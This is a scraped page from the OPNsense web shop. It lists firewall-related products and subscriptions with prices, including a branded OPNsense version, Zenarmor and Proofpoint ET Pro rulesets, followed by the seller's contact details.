* [![Branded Version of OPNsense®](https://shop.opnsense.com/wp-content/uploads/2020/12/OPNsense_Branding-324x324.jpg)
  Branded Version of OPNsense®](https://shop.opnsense.com/product/branded-version-of-opnsense/)
  €2.198,00
  [Add to cart](?add-to-cart=803)
* [![Zenarmor (Sensei) by Sunny Valley (external)](https://shop.opnsense.com/wp-content/uploads/2020/12/Zenarmor-324x324.jpg)
  Zenarmor (Sensei) by Sunny Valley (external)](https://shop.opnsense.com/product/zenarmor/)

  [Buy product](https://sunnyvalley.cloud/)
* [![Proofpoint ET Pro Ruleset 1yr subscription](https://shop.opnsense.com/wp-content/uploads/2020/12/etpro_proofpoint-324x324.jpg)
  Proofpoint ET Pro Ruleset 1yr subscription](https://shop.opnsense.com/product/proofpoint-et-pro-ruleset-1yr-subscription/)
  €749,00  / year
  [Select options](https://shop.opnsense.com/product/proofpoint-et-pro-ruleset-1yr-subscription/)
* [![ETPRO Telemetry edition](https://shop.opnsense.com/wp-content/uploads/2020/10/ETPRO_Telemetry-324x324.png)
  ETPRO Telemetry edition](https://shop.opnsense.com/product/etpro-telemetry/)
  €0,00
  [Select options](https://shop.opnsense.com/product/etpro-telemetry/)

---

![](/wp-content/uploads/2020/09/OPNsense_logo_for_light_background_small_378x128px-300x101.png)

**OPNsense.com**

Deciso Sales B.V.

Edison 43

3241LS Middelharnis

The Netherlands

sales@opnsense.com

+31 187 744 020

Mon-Fri 9h to 17h CET

Categories

* [Hardware](https://shop.opnsense.com/product-categorie/hardware-appliances/)
* [Professional Services](https://shop.opnsense.com/product-categorie/professional_services/)
* [Software & Licenses](https://shop.opnsense.com/product-categorie/software_and_licenses/)
* [Support](https://shop.opnsense.com/product-categorie/support/)

Information

[About Us](/about-us/)

[Contact Us](/contact-us/)

[Terms & Conditions](/terms-conditions/)

[Returns & Exchanges](/returns-exchanges/)

[Shipping & Delivery](/shipping-delivery/)

[Privacy Statement](/privacy-policy/)

Quick Links

[Your Account](/mijn-account/)

[Community Website](https://opnsense.org)

[Deciso Company Website](https://www.deciso.com)

[ETPRO Telemetry FAQ](/etpro-telemetry-faq/)

* [My Account](https://shop.opnsense.com/mijn-account/)
* Search
  Search for:

  Search
* [Cart 0](https://shop.opnsense.com/winkelmand/)


